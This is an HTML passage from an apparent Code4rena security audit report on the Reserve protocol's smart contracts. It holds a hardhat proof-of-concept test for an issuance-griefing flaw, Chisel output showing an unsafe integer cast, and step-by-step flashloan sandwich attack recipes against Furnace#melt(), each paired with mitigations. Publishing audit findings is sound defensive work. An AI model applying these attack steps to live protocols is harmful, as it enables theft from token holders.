class=\"mtk12\">MaxInt256</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Get initial balances</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initialRecipientBals</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Promise</span><span class=\"mtk1\">.</span><span class=\"mtk11\">all</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokens</span><span class=\"mtk1\">.</span><span class=\"mtk11\">map</span><span class=\"mtk1\">((</span><span class=\"mtk12\">t</span><span class=\"mtk1\">) </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">t</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Issue a lot of rTokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">)[</span><span class=\"mtk8\">&#39;issue(address,uint256)&#39;</span><span class=\"mtk1\">](</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">issueAmount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Cancel</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">).</span><span class=\"mtk11\">cancel</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        .</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">emit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;IssuancesCanceled&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        .</span><span class=\"mtk11\">withArgs</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">issueAmount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// repeat to make allVestAt very large</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">for</span><span class=\"mtk1\">(</span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\">&lt;</span><span class=\"mtk7\">100</span><span class=\"mtk1\"> ; </span><span class=\"mtk12\">j</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">)[</span><span class=\"mtk8\">&#39;issue(address,uint256)&#39;</span><span class=\"mtk1\">](</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">issueAmount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">).</span><span class=\"mtk11\">cancel</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          .</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">emit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;IssuancesCanceled&#39;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          .</span><span class=\"mtk11\">withArgs</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">issueAmount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Check balances returned to the recipient, addr2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Promise</span><span class=\"mtk1\">.</span><span class=\"mtk11\">all</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokens</span><span class=\"mtk1\">.</span><span class=\"mtk11\">map</span><span class=\"mtk1\">(</span><span class=\"mtk4\">async</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">t</span><span class=\"mtk1\">, </span><span class=\"mtk12\">i</span><span class=\"mtk1\">) </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">expectedBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">initialRecipientBals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">depositTokenAmounts</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">t</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">expectedBalance</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">facadeTest</span><span class=\"mtk1\">.</span><span class=\"mtk12\">callStatic</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalAssetValue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">instantIssue</span><span class=\"mtk1\">: </span><span class=\"mtk10\">BigNumber</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">MIN_ISSUANCE_PER_BLOCK</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Promise</span><span class=\"mtk1\">.</span><span class=\"mtk11\">all</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokens</span><span class=\"mtk1\">.</span><span class=\"mtk11\">map</span><span class=\"mtk1\">((</span><span class=\"mtk12\">t</span><span class=\"mtk1\">) </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">t</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">initialBal</span><span class=\"mtk1\">)))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// what should have been immediate issuance will be queued</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">)[</span><span class=\"mtk8\">&#39;issue(uint256)&#39;</span><span class=\"mtk1\">](</span><span class=\"mtk12\">instantIssue</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">issuances</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">facade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">callStatic</span><span class=\"mtk1\">.</span><span class=\"mtk11\">pendingIssuances</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">addr1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">issuances</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">eql</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    })</span></span></span></code></pre>\n<h3 id=\"tools-used-7\" style=\"position:relative;\"><a href=\"#tools-used-7\" aria-label=\"tools used 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Manual auditing and hardhat</p>\n<h3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p><code>cancel</code> could decrease the <code>allVestAt</code>. Even though, there’s still a small possibility to grief by front running someones issuance with a large <code>issue</code>/<code>cancel</code> causing their vest to be late, but this is perhaps an acceptable risk as they can then just cancel and re-issue.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/364#issuecomment-1405483304\">tbrent (Reserve) confirmed via duplicate issue <code>#364</code></a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed\">tbrent (Reserve) mitigated</a>:</strong></p>\n<blockquote>\n<p>This PR removes the non-atomic issuance mechanism and adds an issuance throttle. The redemption battery is rebranded to a redemption throttle.<br>\n<a href=\"https://github.com/reserve-protocol/protocol/pull/571\">reserve-protocol/protocol#571</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed with comments. Full details in reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/10\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/59\">0xA5DF</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/37\">AkshaySrivastav</a>.</p>\n<hr>\n<h2 id=\"m-14-unsafe-cast-of-uint8-datatype-to-int8\" style=\"position:relative;\"><a href=\"#m-14-unsafe-cast-of-uint8-datatype-to-int8\" aria-label=\"m 14 unsafe cast of uint8 datatype to int8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/265\">[M-14] Unsafe cast of <code>uint8</code> datatype to <code>int8</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/265\">0xTaylor</a></em></p>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L228\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L228</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L421\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L421</a></p>\n<p>Converting uint8 to int8 can have unexpected consequences when done unsafely. This issue affects the quote function in BasketHandler.sol and handoutExcessAssets in BackingManager.sol. While there is some risk here, the issue is unlikely to be exploited as ERC-20 tokens generally don’t have a decimals value over 18, nevertheless one over 127.</p>\n<h3 id=\"proof-of-concept-14\" style=\"position:relative;\"><a href=\"#proof-of-concept-14\" aria-label=\"proof of concept 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">➜ int8(uint8(127))</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Type: int</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">├ Hex: 0x7f</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">└ Decimal: 127</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">➜ int8(uint8(128))</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Type: int</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">├ Hex: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff80</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">└ Decimal: -128</span></span></code></pre>\n<h3 id=\"tools-used-8\" style=\"position:relative;\"><a href=\"#tools-used-8\" aria-label=\"tools used 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Chisel</p>\n<h3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Validate that the decimals value is within an acceptable upper-bound before attempting to cast it to a signed integer.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/265#issuecomment-1401152907\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden does make a reasonable point re: the cast being done here and others have pointed out concerns over assuming that an ERC20 <em>must</em> have a decimals field.</p>\n<p>Will leave open for sponsor review, but I think this would qualify as Medium.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/265#issuecomment-1404412161\">tbrent (Reserve) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>Agreed, seems Medium to me. </p>\n</blockquote>\n<hr>\n<h2 id=\"m-15-the-furnacemelt-is-vulnerable-to-sandwich-attacks\" style=\"position:relative;\"><a href=\"#m-15-the-furnacemelt-is-vulnerable-to-sandwich-attacks\" aria-label=\"m 15 the furnacemelt is vulnerable to sandwich attacks permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/258\">[M-15] The <code>Furnace#melt()</code> is vulnerable to sandwich attacks</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/258\">wait</a></em></p>\n<p>Malicious users can get more of the RToken appreciation benefit brought by <a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Furnace.sol#L70\"><code>Furnace.sol#melt()</code></a>, and long-term RToken holders will get less benefit.</p>\n<p>RToken holders will be less willing to provide liquidity to RToken pools (such as uniswap pools), resulting in less liquidity of RToken.</p>\n<h3 id=\"proof-of-concept-15\" style=\"position:relative;\"><a href=\"#proof-of-concept-15\" aria-label=\"proof of concept 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><strong>A1. Gain revenue from a flashloan sandwich attack</strong></p>\n<p>A malicious user can launch a flashloan sandwich attack against <a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Furnace.sol#L70\">Furnace#melt()</a> each time a whole period passed (payout happens).</p>\n<p>The attack transaction execution steps:</p>\n<ol>\n<li>Borrow some assets (<code>inputFund</code>) with a flashloan</li>\n<li>Swap the <code>inputFund</code> for RToken</li>\n<li>Call <a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439\">RToken#redeem()</a> to change the RToken to basket assets(<code>outputFund</code>). The <code>redeem()</code> will invoke <code>Furnace.melt()</code> automatically.</li>\n<li>Swap part of <code>outputFund</code> for <code>inputFund</code> and pay back the flashloan, the rest of <code>outputFund</code> is the profit.</li>\n</ol>\n<p>The implicit assumption here is that most of the time the prices of RToken in <code>RToken.issues()</code>, <code>RToken.redeem()</code>, and DeFi pools are almost equal.</p>\n<p>This assumption is reasonable because if there are price differentials, they can be balanced by arbitrage.</p>\n<p>The attack can be profitable for:</p>\n<ul>\n<li><code>Furnace#melt()</code> will increase the price of RToken in issue/redeem (according to basket rate).</li>\n<li>Step 2 buys RTokens at a lower price, and then step 3 sells RTokens at a higher price(<code>melt()</code> is called first in <code>redeem()</code>).</li>\n</ul>\n<p><strong>A2. Get a higher yield by holding RToken for a short period of time</strong></p>\n<p>Malicious users can get higher yield by by following these steps:</p>\n<ol>\n<li>Calculate <a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Furnace.sol#L71\">the next payout block</a> of Furnace in advance</li>\n<li>Call <a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L177\">RToken#issue()</a> 1 to n blocks before the payout block</li>\n<li>Call <a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439\">RToken#redeem()</a> when the payout block reaches.</li>\n</ol>\n<p>Since this approach only requires 1 to n blocks to issue in advance, which is typically much smaller than <a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2b/docs/system-design.md#rewardperiod\">rewardPeriod</a>, the attacker will obtain much higher APR than long-term RToken holders.</p>\n<h3 id=\"recommended-mitigation-steps-14\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-14\" aria-label=\"recommended mitigation steps 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 